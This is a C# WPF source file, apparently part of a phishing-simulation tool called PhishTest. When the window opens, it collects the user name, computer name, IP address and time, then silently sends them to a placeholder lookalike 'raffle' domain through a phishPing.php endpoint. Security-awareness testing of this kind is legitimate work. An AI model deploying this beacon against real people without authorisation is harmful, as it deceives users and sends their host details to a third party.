using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.IO;
// Developed by @ayalbreiki at Twitter (https://twitter.com/ayalbreiki)
namespace PhishTest
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            string computername = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
            string user = Environment.UserName;
            string date = System.DateTime.Now.ToString("yyyy.MM.dd");
            string time = DateTime.Now.ToString("h:mm:ss tt");
            string ip = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();

            this.footer.Content = "User: " + user + " using " + computername + " (" + ip + "). Time: " + date  + " at " + time + " | © 2019 YOURCOMPANYNAME";
            sendToAPI(user, computername, ip, date, time);
        }
        private void sendToAPI(String user, String ComputerName, String ip, String date, String time)
        {
            string url = @"https://raffle.YOURCOMPANYNAME.com.ALTERNATIVEDOMAIN.ae/phishPing.php?u=" + user + "&cn=" + ComputerName + "&ip=" + ip + "&d=" + date + "&t=" + time;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            Console.WriteLine(url);

            string html = "";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        html = reader.ReadToEnd();
                    }
                }
            }
        }
    }
}
